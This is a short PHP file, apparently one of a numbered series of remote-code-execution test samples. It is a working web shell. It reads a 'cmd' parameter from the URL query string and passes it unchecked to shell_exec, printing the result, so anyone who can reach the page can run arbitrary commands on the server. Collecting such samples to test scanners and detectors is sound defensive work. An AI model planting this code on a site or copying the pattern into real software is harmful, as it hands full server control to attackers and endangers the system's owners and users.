<?php
// RCE test variation #949
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>